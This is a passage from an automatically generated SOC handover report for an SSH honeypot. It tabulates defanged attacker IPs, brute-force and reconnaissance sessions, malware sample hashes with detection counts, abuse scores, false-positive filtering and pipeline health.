| `130.250.231[.]114` | **11** | 2026-03-12 02:50 | 2026-03-12 02:59 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.225.146[.]23` | **11** | 2026-03-12 05:22 | 2026-03-12 05:49 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.82.214[.]8` | **11** | 2026-03-12 02:47 | 2026-03-12 03:18 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.156[.]170` | **10** | 2026-03-12 05:15 | 2026-03-12 05:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.164.66[.]10` | **10** | 2026-03-12 00:51 | 2026-03-12 01:11 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.33.210[.]213` | **10** | 2026-03-12 14:20 | 2026-03-12 14:44 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.246.139[.]120` | **10** | 2026-03-12 05:14 | 2026-03-12 05:39 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `221.182.17[.]158` | **9** | 2026-03-12 12:01 | 2026-03-12 12:51 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | **6** | 2026-03-12 07:08 | 2026-03-12 07:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `119.195.89[.]159` | **5** | 2026-03-12 08:59 | 2026-03-12 09:09 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `94.26.106[.]200` | **5** | 2026-03-12 10:22 | 2026-03-12 10:32 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `3.134.100[.]58` | **3** | 2026-03-12 05:40 | 2026-03-12 05:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.153[.]132` | **3** | 2026-03-12 02:30 | 2026-03-12 02:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `170.64.179[.]179` | **2** | 2026-03-12 04:05 | 2026-03-12 04:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]3` | **2** | 2026-03-12 05:03 | 2026-03-12 05:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.255.131[.]32` | **2** | 2026-03-12 05:43 | 2026-03-12 05:44 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.93.89[.]95` | **2** | 2026-03-12 08:26 | 2026-03-12 08:28 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `188.166.37[.]151` | **2** | 2026-03-12 04:08 | 2026-03-12 04:09 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.193[.]183` | **2** | 2026-03-12 07:43 | 2026-03-12 07:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.168.34[.]62` | **2** | 2026-03-12 06:41 | 2026-03-12 06:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]179` | 1 | 2026-03-12 04:26 | 2026-03-12 04:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.71.39[.]70` | 1 | 2026-03-12 03:50 | 2026-03-12 03:50 | 12s | 0 | `T1592` | 🟢 LOW |
| `112.196.70[.]142` | 1 | 2026-03-12 07:15 | 2026-03-12 07:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.27.102[.]137` | 1 | 2026-03-12 07:49 | 2026-03-12 07:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.141.171[.]139` | 1 | 2026-03-12 01:25 | 2026-03-12 01:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.31.107[.]103` | 1 | 2026-03-12 12:03 | 2026-03-12 12:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.132.170[.]91` | 1 | 2026-03-12 02:51 | 2026-03-12 02:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]195` | 1 | 2026-03-12 02:51 | 2026-03-12 02:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]195` | 1 | 2026-03-12 05:02 | 2026-03-12 05:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.233.44[.]129` | 1 | 2026-03-12 05:14 | 2026-03-12 05:14 | 15s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-12 00:11 | 2026-03-12 00:12 | 64s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.109[.]159` | 1 | 2026-03-12 02:45 | 2026-03-12 02:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.122[.]158` | 1 | 2026-03-12 09:04 | 2026-03-12 09:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.151[.]153` | 1 | 2026-03-12 01:58 | 2026-03-12 01:59 | 43s | 0 | `T1592` | 🟢 LOW |
| `121.179.33[.]209` | 1 | 2026-03-12 14:24 | 2026-03-12 14:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `131.100.189[.]228` | 1 | 2026-03-12 06:20 | 2026-03-12 06:21 | 37s | 0 | `T1592` | 🟢 LOW |
| `14.103.37[.]34` | 1 | 2026-03-12 14:23 | 2026-03-12 14:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `151.40.73[.]173` | 1 | 2026-03-12 12:34 | 2026-03-12 12:34 | 14s | 0 | `T1592` | 🟢 LOW |
| `151.64.228[.]179` | 1 | 2026-03-12 13:35 | 2026-03-12 13:36 | 14s | 0 | `T1592` | 🟢 LOW |
| `173.24.222[.]84` | 1 | 2026-03-12 11:59 | 2026-03-12 11:59 | 12s | 0 | `T1592` | 🟢 LOW |
| `175.137.11[.]233` | 1 | 2026-03-12 03:05 | 2026-03-12 03:05 | 12s | 0 | `T1592` | 🟢 LOW |
| `175.137.11[.]233` | 1 | 2026-03-12 05:51 | 2026-03-12 05:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `178.204.143[.]1` | 1 | 2026-03-12 09:13 | 2026-03-12 09:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `179.96.190[.]108` | 1 | 2026-03-12 07:35 | 2026-03-12 07:36 | 31s | 0 | `T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-03-12 05:14 | 2026-03-12 05:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.182[.]87` | 1 | 2026-03-12 14:15 | 2026-03-12 14:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.57[.]208` | 1 | 2026-03-12 02:24 | 2026-03-12 02:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.93.172[.]213` | 1 | 2026-03-12 12:40 | 2026-03-12 12:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.23.54[.]250` | 1 | 2026-03-12 14:28 | 2026-03-12 14:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.152.101[.]151` | 1 | 2026-03-12 07:04 | 2026-03-12 07:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]25` | 1 | 2026-03-12 02:03 | 2026-03-12 02:03 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]30` | 1 | 2026-03-12 02:03 | 2026-03-12 02:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.0.174[.]221` | 1 | 2026-03-12 08:26 | 2026-03-12 08:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `220.133.4[.]160` | 1 | 2026-03-12 13:45 | 2026-03-12 13:45 | 30s | 0 | `T1592` | 🟢 LOW |
| `221.154.80[.]200` | 1 | 2026-03-12 03:58 | 2026-03-12 03:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `221.182.17[.]158` | 1 | 2026-03-12 09:05 | 2026-03-12 09:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.126.138[.]37` | 1 | 2026-03-12 07:37 | 2026-03-12 07:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.173.36[.]13` | 1 | 2026-03-12 05:20 | 2026-03-12 05:20 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.249.171[.]213` | 1 | 2026-03-12 07:41 | 2026-03-12 07:42 | 31s | 0 | `T1592` | 🟢 LOW |
| `47.91.20[.]137` | 1 | 2026-03-12 01:23 | 2026-03-12 01:23 | 8s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-12 08:03 | 2026-03-12 08:04 | 78s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-12 10:45 | 2026-03-12 10:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.73.163[.]9` | 1 | 2026-03-12 04:27 | 2026-03-12 04:27 | 12s | 0 | `T1592` | 🟢 LOW |
| `72.201.174[.]12` | 1 | 2026-03-12 06:02 | 2026-03-12 06:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `87.31.248[.]227` | 1 | 2026-03-12 10:18 | 2026-03-12 10:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `89.200.85[.]114` | 1 | 2026-03-12 11:37 | 2026-03-12 11:37 | 11s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]121` | 1 | 2026-03-12 08:14 | 2026-03-12 08:15 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]149` | 1 | 2026-03-12 02:05 | 2026-03-12 02:05 | 2s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]255` | 1 | 2026-03-12 08:14 | 2026-03-12 08:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.26.106[.]200` | 1 | 2026-03-12 02:45 | 2026-03-12 02:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (3 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `188.166.37[.]151` | NL | Digital Ocean, Inc. | **100** ⚠️ | 1 |
| `115.132.170[.]91` | MY | TMNST | **100** ⚠️ | 3 |
| `119.195.89[.]159` | KR | Korea Telecom | **100** ⚠️ | 22 |
| `185.247.137[.]3` | GB | Driftnet Ltd | **100** ⚠️ | 24 |
| `206.168.34[.]62` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `113.31.107[.]103` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 50 |
| `178.204.143[.]1` | RU | Kazan Broad-band access pools | **100** ⚠️ | 2 |
| `131.100.189[.]228` | BR | CONECT TELECOMUNICACOES COMUNICACOES E MULTIMIDIA | **100** ⚠️ | 5 |
| `72.201.174[.]12` | US | Cox Communications | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |

---

## 🔕 False Positive Summary (175 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 31 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 12 |
| AbuseIPDB score 16 below threshold 25 | 25 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 28 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 74 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 459 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 124 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 175 filtered (38.1%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 3 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 36 priority case(s) shown individually · 76 recon entry/entries in table (26 group(s) consolidating 198 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-12T14:46:34Z_
